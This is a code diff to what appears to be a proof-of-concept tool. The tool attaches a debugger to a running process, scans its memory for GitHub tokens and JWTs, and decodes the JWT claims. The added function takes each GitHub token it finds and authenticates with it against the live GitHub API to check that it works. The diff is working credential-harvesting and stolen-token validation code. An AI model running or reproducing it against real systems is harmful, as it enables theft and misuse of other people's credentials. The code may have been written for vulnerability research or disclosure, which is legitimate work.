@@ -15,6 +15,8 @@ import select
 import struct
 import sys
 import time
+import urllib.error
+import urllib.request
 
 
 SESSION_REQUEST = 0
@@ -408,6 +410,41 @@ def secret_summary(key, value):
             pass
 
 
+def jwt_public_metadata(value):
+    try:
+        payload = value.split(b".", 2)[1]
+        payload += b"=" * (-len(payload) % 4)
+        claims = json.loads(__import__("base64").urlsafe_b64decode(payload))
+        return {field: claims[field] for field in ("iss", "aud", "nbf", "exp") if field in claims}
+    except Exception:
+        return {}
+
+
+def validate_github_token(value):
+    request = urllib.request.Request(
+        "https://api.github.com/rate_limit",
+        headers={
+            "Authorization": "Bearer " + value.decode("ascii"),
+            "Accept": "application/vnd.github+json",
+            "X-GitHub-Api-Version": "2022-11-28",
+            "User-Agent": "clrpipe-poc-3900000",
+        },
+    )
+    try:
+        with urllib.request.urlopen(request, timeout=10) as response:
+            print(
+                f"PIPE_TOKEN_VALIDATE kind=github status={response.status} "
+                f"rate_limit={response.headers.get('x-ratelimit-limit', '?')}",
+                flush=True,
+            )
+            return response.status == 200
+    except urllib.error.HTTPError as error:
+        print(f"PIPE_TOKEN_VALIDATE kind=github status={error.code}", flush=True)
+    except OSError as error:
+        print(f"PIPE_TOKEN_VALIDATE kind=github network_error={type(error).__name__}", flush=True)
+    return False
+
+
 ASCII_SECRET_PATTERNS = (
     ("github-token", re.compile(rb"(?:gh[psoru]_[A-Za-z0-9_]{20,255}|github_pat_[A-Za-z0-9_]{20,255})")),
     ("jwt", re.compile(rb"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}")),
@@ -436,7 +473,7 @@ def find_tokens(data):
             if offset < 0:
                 break
             value = utf16_token_at(data, offset)
-            if (kind.startswith("github") and (value.startswith((b"ghp_", b"ghs_", b"gho_", b"ghr_", b"ghu_", b"github_pat_")))) or (
+            if (kind.startswith("github") and len(value) >= 20 and (value.startswith((b"ghp_", b"ghs_", b"gho_", b"ghr_", b"ghu_", b"github_pat_")))) or (
                 kind.startswith("jwt") and value.count(b".") >= 2 and len(value) >= 40
             ):
                 yield kind, value
@@ -496,6 +533,12 @@ def scan_for_memory_secrets(debugger, pid, anchors):
                     f"PIPE_MEMORY_SECRET kind={kind} length={len(value)} sha256={digest} inherited=false",
                     flush=True,
                 )
+                if kind == "github-token" and 30 <= len(value) <= 255:
+                    validate_github_token(value)
+                elif kind == "jwt":
+                    metadata = jwt_public_metadata(value)
+                    if metadata:
+                        print(f"PIPE_JWT_META claims={json.dumps(metadata, sort_keys=True)}", flush=True)
                 findings += 1
                 if findings >= 20:
                     break
